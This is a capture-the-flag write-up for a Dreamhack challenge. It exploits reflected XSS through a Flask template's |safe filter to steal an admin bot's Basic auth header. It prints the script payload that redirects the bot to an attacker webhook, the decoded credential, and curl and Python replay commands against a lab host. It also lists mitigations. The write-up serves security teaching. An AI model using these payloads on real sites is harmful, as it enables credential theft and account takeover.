# ？Are you admin?

**Description**: Hmm.. You look suspicious. Are you admin?

---

## Application Analysis

### Flask Application Structure
```python
from flask import Flask, redirect, request, render_template
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from time import sleep
from os import urandom, environ
from urllib.parse import quote, urlparse, parse_qs
from base64 import b64decode, b64encode

app = Flask(__name__)
app.secret_key = urandom(32)

FLAG = environ.get("FLAG", "DH{fake_flag}") 
PASSWORD = environ.get("PASSWORD", "1234")  # Admin password from environment
```

### Key Functions Analysis

#### 1. Admin Bot Function
```python
def access_page(name, detail):
    try:
        user_info = f'admin:{PASSWORD}' 
        encoded_user_info = b64encode(user_info.encode()).decode()
        
        # Selenium WebDriver setup
        service = Service(executable_path="/chromedriver-linux64/chromedriver")
        options = webdriver.ChromeOptions()
        for _ in ["headless", "window-size=1920x1080", "disable-gpu", 
                 "no-sandbox", "disable-dev-shm-usage"]:
            options.add_argument(_)
        
        driver = webdriver.Chrome(service=service, options=options)
        driver.implicitly_wait(3)
        driver.set_page_load_timeout(3)
        
        # Set Authorization header with admin credentials
        driver.execute_cdp_cmd(
            'Network.setExtraHTTPHeaders',
            {'headers': {'Authorization': f'Basic {encoded_user_info}'}}
        )
        
        driver.execute_cdp_cmd('Network.enable', {})
        driver.get(f"http://127.0.0.1:8000/")
        driver.get(f"http://127.0.0.1:8000/intro?name={quote(name)}&detail={quote(detail)}")
        sleep(1)
    except Exception as e:
        print(e, flush=True)
        driver.quit()
        return False
    driver.quit()
    return True
```

#### 2. Route Endpoints

**Index Route**:
```python
@app.route("/", methods=["GET"]) 
def index():
    return redirect("/intro")
```

**Introduction Route**:
```python
@app.route("/intro", methods=["GET"]) 
def intro():
    name = request.args.get("name") 
    detail = request.args.get("detail")
    return render_template("intro.html", name=name, detail=detail)
```

**Report Route (Triggers Admin Bot)**:
```python
@app.route("/report", methods=["GET", "POST"])
def report():
    if request.method == "POST":
        path = request.form.get("path")
        if not path:
            return render_template("report.html", msg="fail")
        else:
            parsed_path = urlparse(path)
            params = parse_qs(parsed_path.query)
            name = params.get("name", [None])[0]
            detail = params.get("detail", [None])[0]

            if access_page(name, detail):
                return render_template("report.html", message="Success")
            else:
                return render_template("report.html", message="fail")
    else:
        return render_template("report.html")
```

**Authentication Check Route**:
```python
@app.route("/whoami", methods=["GET"])
def whoami():
    user_info = ""
    authorization = request.headers.get('Authorization')

    if authorization:
        user_info = b64decode(authorization.split('Basic ')[1].encode()).decode()
    else:
        user_info = "guest:guest"

    id = user_info.split(":")[0]
    password = user_info.split(":")[1]
    
    if ((id == 'admin') and (password == '[**REDACTED**]')):
        message = FLAG
        return render_template('whoami.html', id=id, message=message)
    else:
        message = "You are guest"
        return render_template('whoami.html', id=id, message=message)
```

### Template Analysis (intro.html)
```html
<!-- Key vulnerability: name parameter rendered without escaping -->
<h1>Welcome {{ name|safe }}!</h1>
<p>{{ detail }}</p>
```

**Critical Finding**: The `name` parameter uses the `|safe` filter, meaning HTML/JavaScript content will be rendered without escaping.

---

## Vulnerability Analysis

### 1. Cross-Site Scripting (XSS)
- **Location**: `/intro` endpoint, `name` parameter
- **Type**: Reflected XSS
- **Cause**: `|safe` filter in template bypasses HTML escaping

### 2. Authorization Header Exposure
- **Mechanism**: Admin bot automatically adds `Authorization: Basic <encoded_credentials>` header
- **Target**: Any request made by the admin bot contains valid admin credentials

### 3. Authentication Logic
- **Endpoint**: `/whoami`
- **Validation**: Checks `Authorization` header for admin credentials
- **Reward**: Returns flag if valid admin credentials provided

---

## Exploitation Strategy

### Attack Flow
1. **Craft XSS payload** to steal admin's Authorization header
2. **Submit malicious URL** via `/report` to trigger admin bot
3. **Extract Base64-encoded credentials** from intercepted requests
4. **Replay credentials** to `/whoami` endpoint to retrieve flag

---

## Step-by-Step Exploitation

### Step 1: Craft XSS Payload
**Objective**: Redirect admin bot to external server to capture Authorization header

**Payload**:
```javascript
<script>document.location='https://your-webhook.com/'</script>
```

**Full URL**:
```
/intro?name=<script>document.location='https://your-webhook.com/'</script>&detail=test
```

### Step 2: Trigger Admin Bot
**Submit to Report Form**:
```
POST /report
Content-Type: application/x-www-form-urlencoded

path=/intro?name=<script>document.location='https://your-webhook.com/'</script>&detail=test
```

### Step 3: Capture Authorization Header
**Expected Webhook Request**:
```http
GET / HTTP/1.1
Host: your-webhook.com
Authorization: Basic YWRtaW46MWRlOThlMTM3MDhjMWYxZjYwMjNlMTMxYTdiZDg2NzY=
User-Agent: HeadlessChrome/...
```

### Step 4: Decode Credentials (Optional Verification)
```python
import base64

encoded_creds = "YWRtaW46MWRlOThlMTM3MDhjMWYxZjYwMjNlMTMxYTdiZDg2NzY="
decoded_creds = base64.b64decode(encoded_creds).decode()
print(decoded_creds)  # admin:1de98e13708c1f1f6023e131a7bd8676
```

### Step 5: Retrieve Flag
**Python Script**:
```python
import requests

url = "http://host3.dreamhack.games:23175/whoami"
headers = {
    "Authorization": "Basic YWRtaW46MWRlOThlMTM3MDhjMWYxZjYwMjNlMTMxYTdiZDg2NzY="
}

response = requests.get(url, headers=headers)
print(response.text)  # Contains the flag
```

**Alternative using cURL**:
```bash
curl -H "Authorization: Basic YWRtaW46MWRlOThlMTM3MDhjMWYxZjYwMjNlMTMxYTdiZDg2NzY=" \
     http://host3.dreamhack.games:23175/whoami
```

---

## Technical Deep Dive

### XSS Exploitation Details
```html
<!-- Vulnerable template -->
<h1>Welcome {{ name|safe }}!</h1>

<!-- Payload injection -->
<h1>Welcome <script>document.location='https://webhook.com/'</script>!</h1>
```

### Admin Bot Automation Flow
1. Selenium WebDriver receives malicious URL
2. Chrome browser loads with pre-configured Authorization header
3. XSS payload executes, redirecting to attacker-controlled server
4. Authorization header automatically included in redirect request

### Base64 Encoding/Decoding
```python
# Encoding process (server-side)
user_info = f'admin:{PASSWORD}'  # admin:1de98e13708c1f1f6023e131a7bd8676
encoded = base64.b64encode(user_info.encode()).decode()
# Result: YWRtaW46MWRlOThlMTM3MDhjMWYxZjYwMjNlMTMxYTdiZDg2NzY=

# Decoding process (attack verification)
decoded = base64.b64decode(encoded).decode()
# Result: admin:1de98e13708c1f1f6023e131a7bd8676
```

---

## Key Learning Points

### 1. XSS Prevention
- **Never use `|safe` filter** without proper validation
- **Implement Content Security Policy (CSP)**
- **Use HTML escaping by default**

### 2. Authorization Header Security
- **Avoid including sensitive headers** in automated browser sessions
- **Implement proper session management**
- **Use short-lived tokens instead of static credentials**

### 3. Admin Bot Security
- **Isolate admin bot environment**
- **Implement request filtering**
- **Monitor outbound connections**

---

## Mitigation Strategies

### Code Fixes
```python
# Fix 1: Remove |safe filter
<h1>Welcome {{ name }}!</h1>  # Auto-escapes HTML

# Fix 2: Validate input
from markupsafe import escape
name = escape(request.args.get("name", ""))

# Fix 3: Implement CSP
@app.after_request
def set_csp(response):
    response.headers['Content-Security-Policy'] = "script-src 'self'"
    return response
```

### Infrastructure Security
- Deploy admin bot in isolated network
- Implement egress filtering
- Use JWT tokens with short expiration
- Monitor for suspicious redirects

---

## Tools Used
- **Python requests** - HTTP client for final exploitation
- **Base64 decoder** - Credential verification
- **Webhook service** - Request capture (e.g., RequestBin, ngrok)
- **Browser DevTools** - Payload testing
